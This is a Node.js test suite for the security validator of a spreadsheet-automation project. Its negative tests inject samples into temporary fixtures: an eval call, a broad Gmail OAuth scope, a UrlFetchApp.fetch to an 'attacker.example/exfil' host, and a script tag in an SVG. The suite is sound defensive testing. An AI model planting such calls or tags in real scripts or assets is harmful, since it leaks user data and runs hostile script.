import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const ROOT_DIR = path.resolve(__dirname, '..');

const VALIDATE_SCRIPT = path.join(ROOT_DIR, 'scripts', 'validate-flows.mjs');
const VT_AUDIT_SCRIPT = path.join(ROOT_DIR, 'scripts', 'virustotal-audit.mjs');
const AI_AUDIT_SCRIPT = path.join(ROOT_DIR, 'scripts', 'ai-security-audit.mjs');
const BUILD_MANIFEST_SCRIPT = path.join(ROOT_DIR, 'scripts', 'build-flows-manifest.mjs');

const AUDIT_STATUS_PATH = path.join(ROOT_DIR, 'flows', 'audit-status.json');
const WEB_MANIFEST_PATH = path.join(ROOT_DIR, 'web', 'public', 'flows-manifest.json');
const EXT_BUNDLE_PATH = path.join(ROOT_DIR, 'extension', 'flows-bundle.json');
const SOURCE_FLOW_DIR = path.join(ROOT_DIR, 'flows', 'b2b-client-invoice');

function runNodeScript(scriptPath, args = []) {
  return execFileSync(process.execPath, [scriptPath, ...args], {
    cwd: ROOT_DIR,
    encoding: 'utf8',
    stdio: ['ignore', 'pipe', 'pipe'],
  });
}

function withTempFlowFixture(mutateFn, testFn) {
  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'sheetautomate-sec-'));
  const fixtureSlug = 'b2b-client-invoice';
  const fixtureDir = path.join(tmpRoot, fixtureSlug);
  try {
    fs.cpSync(SOURCE_FLOW_DIR, fixtureDir, { recursive: true });
    // Sanity-check that the unmodified copied fixture passes validation first.
    runNodeScript(VALIDATE_SCRIPT, ['--flows-dir', tmpRoot]);
    mutateFn(fixtureDir);
    testFn(tmpRoot, fixtureDir);
  } finally {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
}

function assertValidationFails(tmpRoot, expectedStderrRegex) {
  let failed = false;
  try {
    runNodeScript(VALIDATE_SCRIPT, ['--flows-dir', tmpRoot]);
  } catch (err) {
    failed = true;
    assert.notEqual(err.status, 0, 'Expected non-zero exit code from validate-flows.mjs');
    const combinedOutput = `${err.stdout || ''}\n${err.stderr || ''}`;
    assert.match(combinedOutput, expectedStderrRegex);
  }
  assert.equal(failed, true, 'Expected validate-flows.mjs --flows-dir to fail on negative fixture');
}

test('positive: validate-flows.mjs passes on all flows with 0 errors', () => {
  const stdout = runNodeScript(VALIDATE_SCRIPT);
  assert.match(stdout, /Errors:\s*0\b/);
});

test('positive: virustotal-audit.mjs --dry-run exits 0 and is idempotent', () => {
  const before = fs.readFileSync(AUDIT_STATUS_PATH, 'utf8');
  const stdout1 = runNodeScript(VT_AUDIT_SCRIPT, ['--dry-run']);
  assert.match(stdout1, /VirusTotal & Bundle Integrity Audit/);
  const afterRun1 = fs.readFileSync(AUDIT_STATUS_PATH, 'utf8');

  const stdout2 = runNodeScript(VT_AUDIT_SCRIPT, ['--dry-run']);
  assert.match(stdout2, /VirusTotal & Bundle Integrity Audit/);
  const afterRun2 = fs.readFileSync(AUDIT_STATUS_PATH, 'utf8');

  assert.equal(afterRun1, before);
  assert.equal(afterRun2, afterRun1);
  assert.equal(JSON.parse(afterRun2).updatedAt, JSON.parse(before).updatedAt);
});

test('positive: ai-security-audit.mjs --dry-run exits 0 and is idempotent', () => {
  const before = fs.readFileSync(AUDIT_STATUS_PATH, 'utf8');
  const stdout1 = runNodeScript(AI_AUDIT_SCRIPT, ['--dry-run']);
  assert.match(stdout1, /AI & Static Security Audit Report/);
  const afterRun1 = fs.readFileSync(AUDIT_STATUS_PATH, 'utf8');

  const stdout2 = runNodeScript(AI_AUDIT_SCRIPT, ['--dry-run']);
  assert.match(stdout2, /AI & Static Security Audit Report/);
  const afterRun2 = fs.readFileSync(AUDIT_STATUS_PATH, 'utf8');

  assert.equal(afterRun1, before);
  assert.equal(afterRun2, afterRun1);
  assert.equal(JSON.parse(afterRun2).updatedAt, JSON.parse(before).updatedAt);
});

test('positive: two consecutive runs of build-flows-manifest.mjs exit 0 and produce identical outputs', () => {
  const stdout1 = runNodeScript(BUILD_MANIFEST_SCRIPT);
  assert.match(stdout1, /Built flows manifest/);
  const webRun1 = fs.readFileSync(WEB_MANIFEST_PATH, 'utf8');
  const extRun1 = fs.readFileSync(EXT_BUNDLE_PATH, 'utf8');

  const stdout2 = runNodeScript(BUILD_MANIFEST_SCRIPT);
  assert.match(stdout2, /Built flows manifest/);
  const webRun2 = fs.readFileSync(WEB_MANIFEST_PATH, 'utf8');
  const extRun2 = fs.readFileSync(EXT_BUNDLE_PATH, 'utf8');

  assert.equal(webRun2, webRun1);
  assert.equal(extRun2, extRun1);
  assert.equal(webRun2, extRun2);
  assert.equal(JSON.parse(webRun2).generatedAt, JSON.parse(webRun1).generatedAt);
});

test("negative 1: injecting eval('1+1') in Code.gs fails validate-flows.mjs --flows-dir", () => {
  withTempFlowFixture(
    (fixtureDir) => {
      const codePath = path.join(fixtureDir, 'Code.gs');
      fs.appendFileSync(codePath, "\nfunction unsafeHelper_() { return eval('1+1'); }\n", 'utf8');
    },
    (tmpRoot) => {
      assertValidationFails(tmpRoot, /forbidden eval\(/i);
    }
  );
});

test('negative 2: injecting forbidden OAuth scope https://mail.google.com/ fails validate-flows.mjs --flows-dir', () => {
  withTempFlowFixture(
    (fixtureDir) => {
      const manifestPath = path.join(fixtureDir, 'appsscript.json');
      const manifest = JSON.parse(fs.readFileSync(manifestPath, 'utf8'));
      manifest.oauthScopes.push('https://mail.google.com/');
      fs.writeFileSync(manifestPath, JSON.stringify(manifest, null, 2), 'utf8');
    },
    (tmpRoot) => {
      assertValidationFails(tmpRoot, /overly broad OAuth scope "https:\/\/mail\.google\.com\/"/);
    }
  );
});

test("negative 3: injecting UrlFetchApp.fetch('https://attacker.example/exfil') fails validate-flows.mjs --flows-dir", () => {
  withTempFlowFixture(
    (fixtureDir) => {
      const codePath = path.join(fixtureDir, 'Code.gs');
      fs.appendFileSync(
        codePath,
        "\nfunction exfil_() { UrlFetchApp.fetch('https://attacker.example/exfil'); }\n",
        'utf8'
      );
    },
    (tmpRoot) => {
      assertValidationFails(tmpRoot, /hardcoded external UrlFetchApp\.fetch URL/i);
    }
  );
});

test('negative 4a: removing LockService guard from Code.gs fails validate-flows.mjs --flows-dir', () => {
  withTempFlowFixture(
    (fixtureDir) => {
      const codePath = path.join(fixtureDir, 'Code.gs');
      const code = fs.readFileSync(codePath, 'utf8').replace(/\bLockService\b/g, 'NoLockHelper');
      fs.writeFileSync(codePath, code, 'utf8');
    },
    (tmpRoot) => {
      assertValidationFails(tmpRoot, /missing LockService concurrency guard/i);
    }
  );
});

test('negative 4b: removing onOpen() handler from Code.gs fails validate-flows.mjs --flows-dir', () => {
  withTempFlowFixture(
    (fixtureDir) => {
      const codePath = path.join(fixtureDir, 'Code.gs');
      const code = fs.readFileSync(codePath, 'utf8').replace(/\bonOpen\s*\(/g, 'onCustomStart(');
      fs.writeFileSync(codePath, code, 'utf8');
    },
    (tmpRoot) => {
      assertValidationFails(tmpRoot, /missing onOpen\(\) menu handler/i);
    }
  );
});

test('negative 5a: injecting <script> tag in thumbnail.svg fails validate-flows.mjs --flows-dir', () => {
  withTempFlowFixture(
    (fixtureDir) => {
      const svgPath = path.join(fixtureDir, 'thumbnail.svg');
      const svg = fs.readFileSync(svgPath, 'utf8').replace('</svg>', '<script>alert(1)</script></svg>');
      fs.writeFileSync(svgPath, svg, 'utf8');
    },
    (tmpRoot) => {
      assertValidationFails(tmpRoot, /forbidden <script tag/i);
    }
  );
});

test('negative 5b: injecting emoji character in thumbnail.svg fails validate-flows.mjs --flows-dir', () => {
  withTempFlowFixture(
    (fixtureDir) => {
      const svgPath = path.join(fixtureDir, 'thumbnail.svg');
      const svg = fs.readFileSync(svgPath, 'utf8').replace('</svg>', '<text>\u{1F680}</text></svg>');
      fs.writeFileSync(svgPath, svg, 'utf8');
    },
    (tmpRoot) => {
      assertValidationFails(tmpRoot, /forbidden emoji character/i);
    }
  );
});
